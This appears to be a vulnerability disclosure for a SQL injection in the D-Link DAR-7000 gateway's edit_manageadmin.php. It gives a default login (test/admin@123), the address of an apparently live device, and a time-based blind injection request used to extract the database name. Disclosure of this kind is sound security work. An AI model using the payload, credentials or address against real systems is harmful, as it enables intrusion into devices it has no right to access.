There is a backend SQL injection vulnerability in the D-LINK DAR-7000 series online behavior audit gateway. Attackers can exploit vulnerabilities to gain server privileges or cause business impact on the system.

official： http://www.dlink.com.cn/

version:DAR-7000

 Vulnerability Path  ：/sysmanage/edit_manageadmin.php

See the login page.

https://60.22.74.195:8443/

![image-20230902145448739](/Users/yuelingfeng/Library/Application Support/typora-user-images/image-20230902145448739.png)



There is a default account password present： test/admin@123



![image-20230902145527083](/Users/yuelingfeng/Library/Application Support/typora-user-images/image-20230902145527083.png)



​                               

 Construct the following POC to determine the presence of SQL injection for the id parameter  

POC：

GET /sysmanage/edit_manageadmin.php?id=(select*from(select+if(length(database())=3,sleep(3),1))a) HTTP/1.1

Host: 

Cookie: PHPSESSID=bd56bd0c40b63f91db30ee598e93060b

Accept: text/html, application/xhtml+xml, image/jxr, */*

Accept-Language: zh-CN

User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko

Accept-Encoding: gzip, deflate

Connection: close

![image-20230905164840007](/Users/yuelingfeng/Library/Application Support/typora-user-images/image-20230905164840007.png)

 By analogy, obtain the database name nsg    

![image-20230905164854043](/Users/yuelingfeng/Library/Application Support/typora-user-images/image-20230905164854043.png)

 